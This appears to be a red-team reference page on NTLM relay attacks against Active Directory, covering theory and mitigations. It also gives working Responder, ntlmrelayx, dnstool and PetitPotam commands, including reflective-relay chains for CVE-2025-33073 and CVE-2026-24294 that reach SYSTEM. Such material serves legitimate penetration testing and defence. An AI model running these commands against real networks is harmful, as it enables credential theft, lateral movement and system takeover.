# NTLM Relay — Red Team Notes

## Theory

After forcing a victim to authenticate with LM/NTLM to an attacker-controlled server, the attacker can relay that authentication to a target of choice. Depending on mitigations in place, this can enable lateral movement and privilege escalation in Active Directory.

NTLM auth messages are embedded in application protocols (SMB, HTTP, MSSQL, SMTP, IMAP). Since LM/NTLM are protocol-independent, authentication captured on one protocol can be relayed over a different one — **cross-protocol relay**. Available attacks depend on which protocol carries the auth messages.

- Reference chart of cross-protocol relay outcomes vs. mitigations: tested with Impacket's `ntlmrelayx`.
- Overall attack-path mindmap: see Gabriel Prudhomme's BHIS talk *"Coercions and Relays – The First Cred is the Deepest"*.

### Hash types & crack/relay paths

| Hash | Hashcat mode | Attack method |
| --- | --- | --- |
| LM | 3000 | crack / pass-the-hash |
| NTLM / NT hash | 1000 | crack / pass-the-hash |
| NTLMv1 / Net-NTLMv1 | 5500 | crack / relay |
| NTLMv2 / Net-NTLMv2 | 5600 | crack / relay |



## Mitigations

### Session signing

- Only **SMB** and **LDAP** support it.
- **SMB signing**: "least requirements" — if neither client nor server requires it, the session is unsigned.
- **LDAP signing**: "most requirements" — signed only if both sides support it.
- Must be enforced on the **target** side to block relay. It protects session integrity, not authentication integrity — if signing fails on the victim side, the victim↔attacker session is killed *after* authentication, so the attacker can still relay the captured auth onward (if the target doesn't require signing).
- **MIC** stops attackers from stripping signing-negotiation flags to work around this.
- Cross-protocol relay into a non-signing-capable protocol (e.g., SMB → LDAPS) can glitch the negotiation; attackers use an **unsigning relay** (strip signing flags) to avoid this.

### MIC (Message Integrity Code)

- Optional mitigation guaranteeing NTLM message integrity; blocks tampering during cross-protocol unsigning relays.
- NTLMv2 responses incorporate the NT hash, server challenge, and AvPairs (incl. `msAvFlags`, which enables MIC).
- NTLMv1 responses exclude AvPairs → **no MIC support** on NTLMv1.
- Chain: session signing ← protected by MIC ← enabled by `msAvFlags` ← protected by the NTLMv2 response ← requires the NT hash to forge.
- Known bypasses on unpatched targets:
  - CVE-2019-1040 — Drop the MIC
  - CVE-2019-1166 — Drop the MIC 2
  - CVE-2019-1019 — Steal the session key
- MIC was optional as of Nov 2020; unofficial reports suggest it may now be mandatory. Server 2019 ISOs appear patched against CVE-2019-1040.
- NTLMv1 has no MIC support at all — if NTLMv1 is accepted, relaying + modifying + dropping the MIC is possible.

### EPA (Extended Protection for Authentication)

Mitigates relay on protocols without session signing (HTTPS, LDAPS) via:

- **Channel Binding Token (CBT)** — binds to a TLS channel (HTTPS/LDAPS).
- **Service Binding (SPN)** — used when there's no TLS channel (HTTP).

Full protocol details: MS-NLMP spec.

### Disable LLMNR / NBT-NS

Removes the broadcast name-resolution poisoning vector (Responder/Inveigh) that feeds many relay chains.

- **LLMNR**: `gpedit.msc` → Computer Configuration > Administrative Templates > Network > DNS Client > "Turn off multicast name resolution" → Enabled.
- **NBT-NS**: network adapter > Properties > IPv4 > Advanced > WINS tab > NetBIOS setting → Disable NetBIOS over TCP/IP.

## Practice

### Detection

Check signing / channel-binding requirements (NetExec, Python, run from UNIX-like systems):

```
netexec smb $target
netexec ldap $target
```

### No-credential foothold — relay to LDAP (`--add-computer`)

When no AD account is available for the assessment, relay a captured auth to LDAP to add a machine account and get a foothold. Requirements:

- LDAP signing not required (default: not required)
- LDAP channel binding disabled (default: disabled)
- `ms-DS-MachineAccountQuota` ≥ 1 for the relayed account (default: 10)

Poison LLMNR/mDNS/NBT-NS with Responder and relay to LDAPS (TLS required — account creation isn't allowed unencrypted):

```
# Terminal 1
sudo ./Responder.py -I eth0 -wfrd -P -v

# Terminal 2
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
```

### Abuse — relaying

Tools: `ntlmrelayx` (Python), `MultiRelay` (Python), `Inveigh-Relay` (PowerShell). These stand up relay client/server pairs awaiting an authentication to relay; the tester then triggers a forced-auth coercion.

If combining with Responder for name poisoning, disable Responder's own SMB/HTTP servers first so they don't collide with ntlmrelayx:

```
sed -i 's/SMB = On/SMB = Off/g' /PATH/TO/Responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /PATH/TO/Responder/Responder.conf
```

Basic SAM/LSA secrets dump via relay to SMB (needs the relayed victim to have sufficient privilege on target):

```
ntlmrelayx.py -t smb://$TARGET
```

### NTLM reflective relay

Reflective relay bounces an NTLM/Kerberos auth back at the originating machine, triggered via a coercion. Synacktiv has published a research series on successive bypass techniques.

#### CVE-2025-33073 (patched June 2025)

Abuses ADIDNS to trigger local NTLM authentication reflection:

1. Register a rogue ADIDNS record whose name embeds marshalled target info, which `lsasrv!LsapCheckMarshalledTargetInfo` strips down to a bare hostname.
2. `msv1_0!SspIsTargetLocalhost` then treats the target as local, so the client includes workstation/domain names in `NTLM_NEGOTIATE`.
3. When the victim server sees matching names, `msv1_0!SsprHandleNegotiateMessage` sets `NTLMSSP_NEGOTIATE_LOCAL_CALL` in the `NTLM_CHALLENGE`.
4. A coercion (e.g. PetitPotam) forces `lsass.exe` (SYSTEM) to authenticate to the attacker; `lsass.exe` copies its SYSTEM token into the server context because of the local-call flag.
5. The attacker relays the `NTLM_AUTHENTICATE` back to the victim, which impersonates the SYSTEM token → NT AUTHORITY\\SYSTEM over SMB.

Check SMB signing first:

```
netexec smb "$RANGE" --gen-relay-list targets.txt
```

If signing is enforced, relaying over HTTP instead may still work (e.g. ADCS Web Enrollment via ESC8).

Steps:

```
# 1. Register rogue ADIDNS record pointing at attacker IP (use target's NetBIOS name,
#    since coerced machine == relay target in this reflective case)
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add \
  -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d "$ATTACKER_IP"

# 2a. ntlmrelayx waiting for the auth to relay
ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support --remove-sign-seal

# 2b. Coerce the victim toward the rogue hostname
petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" \
  "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "$TARGET_FQDN"

# 3. Clean up afterward
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action remove \
  -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
```

- `--remove-sign-seal` (Synacktiv's impacket fork) drops `NTLMSSP_NEGOTIATE_SEAL` from negotiate/auth messages — required for this technique.
- A single record (`localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`) can target any vulnerable host, since stripping leaves just `localhost`.
- Patched June 2025 Patch Tuesday — check MSRC for affected versions/KBs.

**Alternative tooling:** `pretender` can replace `dnstool.py`'s DNS registration step (`pretender -i "vmnet2" --spoof "target1UWhR..." --no-dhcp --no-timestamps`); NetExec's coercion module can replace `petitpotam.py` (`nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`); and `ntlmrelayx.py -t smb://TARGET.domain.local -smb2support -c '<cmd>'` runs a command on the target directly instead of dumping SAM/LSA.

#### CVE-2026-24294 — SMB port multiplexing (patched March 2026)

Bypasses the CVE-2025-33073 patch via SMB port multiplexing (Windows 11 24H2 / Server 2025 feature). `WNetAddConnection4W` allows mounting an SMB share on an arbitrary TCP port (`net use ... /tcpport:PORT`); the SMB client reuses an existing TCP connection for a matching share path regardless of the caller's privilege level.

Flow:

1. A low-privileged local user pre-establishes a TCP connection to the attacker's server on a custom port.
2. A coercion forces `lsass.exe` to authenticate to the same share path — it reuses that connection, so the privileged NTLM blob flows through the attacker-controlled socket.
3. The blob is relayed back to the target.

Targets Server 2025 by default; Windows 11 24H2 enforces SMB signing by default and needs an extra bypass.

```
# 1. Low-priv user on the target mounts a share on a custom port
net use \\$ATTACKER_IP\share /tcpport:$PORT

# 2a. Modified smbserver.py listens on that port to extract the privileged blob
smbserver.py -port $PORT share .

# 2b. ntlmrelayx relays it onward
ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support

# 3. Coerce lsass.exe toward the same share path
petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "$ATTACKER_IP" "$TARGET_FQDN"
```

- Patched March 2026 Patch Tuesday — check MSRC for affected versions/KBs.
- As of writing, the modified `smbserver.py` / `PetitPotam.exe` were not yet public; follow Synacktiv's impacket fork for updates.
- Bypass chain extends to Kerberos via CVE-2025-58726 / CVE-2026-26128 (Unicode normalization abuse → AP-REQ reflective relay).

## Tips & tricks

- `-6`: enables IPv6 support, useful alongside mitm6 (DHCPv6 + DNS poisoning); recommended even if most hosts use IPv4, so relay servers handle both.
- `-smb2support`: enables SMB2.
- `--remove-mic`: implements CVE-2019-1040, needed for cross-protocol unsigning relays (e.g. SMB → SMB-with-required-signing, or SMB → LDAP/S) and whenever NTLMv1 is in play (no MIC support).
- `-remove-target` / `-machine-account`: implements CVE-2019-1019 (session key theft).
- `-tf <file>` (instead of `-t`): attack multiple targets from a file; `-w` watches the file for changes and auto-updates the target list.
- `--keep-relaying`: useful in multirelay scenarios when ntlmrelayx stops with "no more targets left" (see Impacket PR #1741).
- Fixed NTLM server challenge (e.g. `112233...`) supports deterministic capture/replay when capturing separately from relaying.
- Target protocol prefix (`ldap://target`, `smb://target`, defaults to `smb`) or `all://target` to hit everything.
- Can restrict relaying to specific target users via the targets file.

### Targets file format (`-tf`)

```
# User filter for SMB only (for now)
smb://$DOMAIN\$USER@$TARGET
smb://$USER@$TARGET

# Custom ports and paths
smb://target:port
http://target:port/somepath

# Domain name instead of IP
ldaps://$TARGET
$TARGET
```

Generate a relay-candidate list (SMB signing not required) with NetExec:

```
netexec smb --gen-relay-list targets.txt $SUBNET
```